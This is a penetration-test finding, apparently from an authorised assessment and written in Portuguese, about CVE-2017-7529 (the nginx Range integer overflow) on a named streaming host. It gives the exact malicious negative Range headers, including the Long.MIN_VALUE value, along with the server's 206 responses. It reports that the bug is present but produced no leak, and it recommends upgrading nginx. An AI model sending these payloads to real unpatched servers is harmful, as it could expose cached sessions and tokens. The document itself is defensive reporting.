# F-006 nginx 1.7.5 — CVE-2017-7529 Range Integer Overflow (BUG CONFIRMADO, sem leak)
Alvo: video02.soultv.com.br (160.202.130.243:80, :443)
Severidade: **Baixa** (vuln presente, sem disclosure confirmado)
Status: **Confirmado (bug behavior) — não explorável para info leak neste host**
Timestamp: 2026-08-27T16:50:00Z (validado Fase 7b — exploit)

## Sumário
O nginx 1.7.5 (2014) em video02 está dentro do range afetado pelo **CVE-2017-7529**
(CVSS 7.5, nginx 0.5.6 – 1.13.2). A vulnerabilidade permite que um request com `Range`
malicioso cause integer overflow e vazamento de memória/cache adjacente (potencialmente
expondo sessões/tokens de admin). **A valiengem confirmou o bug behavior** (nginx aceita
Range negativo e responde `206 Partial Content`), **porém nenhum vazamento de dados foi
alcançado** porque o host não expõe conteúdo servido a partir do `proxy_cache` do nginx —
todos os paths 200 (`/crossdomain.xml`, `/clientaccesspolicy.xml`) são servidos pelo Wowza
REST (upstream) com `Cache-Control: no-cache`, e o range filter faz clamp no tamanho do
arquivo (não há cache node adjacente para ler).

## Reprodução (validação Fase 7b)

### Bug behavior CONFIRMADO — nginx aceita Range negativo
```
GET /clientaccesspolicy.xml  -> HTTP 200, 337 bytes
GET /clientaccesspolicy.xml  com "Range: bytes=-1"
   -> HTTP 206 Partial Content, Content-Range: bytes 336-336/337, 1 byte
GET /clientaccesspolicy.xml  com "Range: bytes=-9223372036854775807"  (Long.MIN_VALUE)
   -> HTTP 206 Partial Content, Content-Range: bytes 0-336/337, 337 bytes
GET /crossdomain.xml  com "Range: bytes=-9223372036854775807"
   -> HTTP 206 Partial Content, Content-Range: bytes 0-281/282, 282 bytes
```
Um nginx **parcheado** rejeitaria o Range negativo com 416 Range Not Satisfiable. O host
responde 206 → **bug presente** (não patcheado).

### Tentativa de LEAK — TODOS os offsets clamped ao tamanho do arquivo
Testados 11 ranges negativos (incl. Long.MIN_VALUE e offsets intermediários em potências de 2):
```
Range=-1                          -> 206, 1 byte   (Content-Range 336-336/337)
Range=-2                          -> 206, 2 bytes  (Content-Range 335-336/337)
Range=-100                        -> 206, 100 bytes
Range=-1000                       -> 206, 337 bytes (clamped 0-336/337)
Range=-9223372036854775807        -> 206, 337 bytes (clamped 0-336/337)
Range=-72057594037927935 (2^56)   -> 206, 337 bytes (clamped)
Range=-36028797018963967 (2^55)   -> 206, 337 bytes (clamped)
Range=-1125899906842624 (2^50)    -> 206, 337 bytes (clamped)
Range=-562949953421312 (2^49)     -> 206, 337 bytes (clamped)
Range=-1,0,-9223372036854775807   -> 206, 1 byte
```
**NENHUMA resposta excedeu o tamanho real do arquivo** (337/282 bytes). Não houve leak de
bytes adjacentes — o integer overflow que vaza conteúdo do cache node anterior NÃO
dispara, pois o conteúdo servido não passa pelo `proxy_cache` do nginx (header
`Cache-Control: no-cache` no upstream Wowza, sem cache file alocado).

## Paths testados
- `/`                  -> 401 (Wowza Digest auth via nginx proxy)
- `/index.html` `/robots.txt` `/favicon.ico` `/static/` `/healthcheck.html` `/status` -> 401
- `/crossdomain.xml`   -> 200, 282 bytes, `Cache-Control: no-cache` (Wowza upstream)
- `/clientaccesspolicy.xml` -> 200, 337 bytes, `Cache-Control: no-cache` (Wowza upstream)

Nenhum path expõe conteúdo cacheável estático servido diretamente pelo nginx (tudo é
proxy para o Wowza REST em 8087). Sem cache = sem adjacência de memória para leak.

## Impacto
- **Baixo**: bug presente (nginx não patcheado), mas **sem info leak confirmado** neste host.
- Não foi possível vazar sessões admin (JSESSIONID), Digest nonces, ou tokens — não há
  conteúdo em cache adjacente para explorar a via clássica do CVE.
- Persiste risco residual se futuro deploy habilitar `proxy_cache` para paths estáticos.

## Recomendação
- Atualizar nginx 1.7.5 → versão ≥ 1.13.3 (patch do CVE-2017-7529). Versão 1.7.5 (2014) está
  fora de suporte há 11 anos e acumula múltiplas CVEs (ver cve_nginx.txt) — upgrade é mandatório.
- Não habilitar `proxy_cache` em paths do Wowza Manager sem revisão de exposição de dados.

## Evidência bruta

- `exploit/outputs/cd1.txt` `cd2.txt` — baseline vs Range negativo em /crossdomain.xml
